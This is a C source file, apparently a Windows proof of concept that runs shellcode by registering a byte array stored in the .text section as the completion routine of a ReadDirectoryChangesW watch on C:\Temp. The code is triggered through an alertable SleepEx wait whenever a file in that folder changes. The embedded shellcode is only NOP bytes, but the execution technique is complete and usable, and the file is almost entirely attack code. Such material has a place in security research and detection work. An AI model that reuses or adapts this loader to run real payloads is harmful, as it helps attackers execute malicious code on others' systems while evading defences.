#include <windows.h>
#include <stdio.h>
/*
[*] ReadDirectoryChanges Shellcode Execution PoC
[*] Author: Osanda Malith Jayathissa - @OsandaMalith
[*] www.osandamalith.com
[*] Date: 25/09/2025
*/
#pragma section(".text")
__declspec(allocate(".text")) unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
};

int main() {
    puts("[*] ReadDirectoryChanges Shellcode Execution PoC");
    puts("[*] Author: Osanda Malith Jayathissa - @OsandaMalith");
    puts("[*] www.osandamalith.com\n");

    LPCWSTR dirPath = L"C:\\Temp"; // Dir to monitor
    HANDLE hDir = CreateFileW(
        dirPath,
        FILE_LIST_DIRECTORY,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED,
        NULL
    );
    if (hDir == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open directory: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Monitoring directory: %ls\n", dirPath);

    printf("[+] Shellcode at: 0x%p\n", shellcode);

    BYTE buffer[1024];
    OVERLAPPED overlapped = { 0 };
    overlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

    BOOL result = ReadDirectoryChangesW(
        hDir,
        buffer,
        sizeof buffer,
        TRUE,
        FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_DIR_NAME,
        NULL,
        &overlapped,
        (LPOVERLAPPED_COMPLETION_ROUTINE)(PVOID)shellcode    // Register shellcode as completion routine
    );
    if (!result) {
        printf("[-] ReadDirectoryChanges failed: %d\n", GetLastError());
        CloseHandle(overlapped.hEvent);
        CloseHandle(hDir);
        return 1;
    }
    printf("[+] Shellcode registered as completion routine!\n");
    printf("\n[*] To trigger shellcode:\n");
    printf("[+] Create/delete/rename a file in: %ls\n", dirPath);

    // Wait for events
    while (TRUE) {
        // SleepEx with alertable wait
        DWORD waitResult = SleepEx(100, TRUE);  // TRUE = alertable 
        if (waitResult == WAIT_IO_COMPLETION) {
            printf("[!] Completion routine executed!\n");
        }
    }

    CloseHandle(overlapped.hEvent);
    CloseHandle(hDir);
    return 0;
}
